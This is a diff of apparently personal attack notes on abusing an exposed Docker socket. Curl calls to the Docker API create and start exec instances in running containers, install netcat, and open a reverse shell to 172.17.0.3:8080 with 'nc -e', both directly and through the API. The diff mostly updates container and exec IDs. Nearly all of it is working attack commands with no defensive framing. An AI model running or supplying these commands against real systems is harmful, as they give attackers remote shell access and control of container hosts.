@@ -17,7 +17,7 @@ curl -s --unix-socket /var/run/docker.sock -X GET http://localhost/images/json |
 
 ==Create Exec instance from running container:
 
-curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/43de4ed6fa5df1e1f06432df00f6070fb8b6213992b84a7ae2646130263cbd4b/exec -H "Content-Type: application/json" -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "DetachKeys": "ctrl-p,ctrl-q", "Tty": false, "Cmd": ["date"] }'
+curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/5adafc1242a9bbb160c2a81d9b7408999c4be545db73b9da0b1ddffbedee5d4e/exec -H "Content-Type: application/json" -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "DetachKeys": "ctrl-p,ctrl-q", "Tty": false, "Cmd": ["date"] }'
 
 
 ==Copy the instance id:
@@ -26,18 +26,18 @@ curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/container
 
 ==Run the exec instance:
 
-curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/exec/46256aeee7dd58d3294d8a93679a80656e0a94e0a2b562e6c4d90679affd7e92/start -H "Content-Type: application/json" -d '{ "Detach": false, "Tty": false }'
+curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/exec/ebf55a4f73932ea9fac77e5ed7829c1e6757dafbef7ffcc247c2f51c6c9778e9/start -H "Content-Type: application/json" -d '{ "Detach": false, "Tty": false }'
 
 
 ------
 
 ==Installing netcat:
 
-curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/43de4ed6fa5df1e1f06432df00f6070fb8b6213992b84a7ae2646130263cbd4b/exec -H "Content-Type: application/json" -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "DetachKeys": "ctrl-p,ctrl-q", "Tty": false, "Cmd": ["apt","install","-y","netcat"] }'
+curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/6c314a55eb4b1d8a340cb677717d536f0e0c9c38a280520b373142f9c4be32a4/exec -H "Content-Type: application/json" -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "DetachKeys": "ctrl-p,ctrl-q", "Tty": false, "Cmd": ["apt","install","-y","netcat"] }'
 
 f24da60ac564085c4a331e65a57fb09a5c7fff8fde0bae2962780f263b57e7a3
 
-curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/exec/f529f39d3b0386af404cf6735110fe0ebfd76a0a6dde57aa09b372c594d6b325/start -H "Content-Type: application/json" -d '{ "Detach": false, "Tty": false }'
+curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/exec/29b4aab392a25018c77dfdad5afe5529f22c50fd30140fe3fddc0f4f7f948004/start -H "Content-Type: application/json" -d '{ "Detach": false, "Tty": false }'
 
 ==Check nc
 
@@ -79,11 +79,11 @@ Send reverse shell:
 
 nc -e /bin/sh 172.17.0.3 8080
 
-curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/43de4ed6fa5df1e1f06432df00f6070fb8b6213992b84a7ae2646130263cbd4b/exec -H "Content-Type: application/json" -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "DetachKeys": "ctrl-p,ctrl-q", "Tty": false, "Cmd": ["nc","-e","/bin/sh","172.17.0.3", "8080"] }'
+curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/6c314a55eb4b1d8a340cb677717d536f0e0c9c38a280520b373142f9c4be32a4/exec -H "Content-Type: application/json" -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "DetachKeys": "ctrl-p,ctrl-q", "Tty": false, "Cmd": ["nc","-e","/bin/bash","172.17.0.3", "8080"] }' 
 
 
 
-curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/exec/d935735b99544f6c89d8624db724ee943389f674c2b556fb59c5865236b15b72/start -H "Content-Type: application/json" -d '{ "Detach": false, "Tty": false }'
+curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/exec/6590f5ce96f0b3e9a65870034cab3eaac5c08a4b03de306abcea637a54f4751d/start -H "Content-Type: application/json" -d '{ "Detach": false, "Tty": false }'
 
 
 
